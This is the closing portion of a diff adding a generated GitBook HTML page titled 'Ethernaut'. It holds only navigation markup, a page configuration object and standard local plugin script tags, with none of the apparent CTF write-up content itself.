+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <!-- <a href="./" class="navigation navigation-prev " aria-label="Previous page: About This Site">
+                    <i class="fa fa-angle-left"></i>
+                </a> -->
+                
+                
+                <!-- <a href="羊城杯 2023 web writeup.html#20230903" class="navigation navigation-next " aria-label="Next page: 羊城杯 2023 web writeup">
+                    <i class="fa fa-angle-right"></i>
+                </a> -->
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Ethernaut","level":"1.2","depth":1,"next":{"title":"羊城杯 2023 web writeup","level":"1.3","depth":1,"anchor":"#20230903","path":"羊城杯 2023 web writeup.md","ref":"羊城杯 2023 web writeup.md#20230903","articles":[]},"previous":{"title":"About This Site","level":"1.1","depth":1,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr"],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"Ethernaut.md","mtime":"2023-10-15T16:40:59.870Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-10-15T16:42:43.040Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
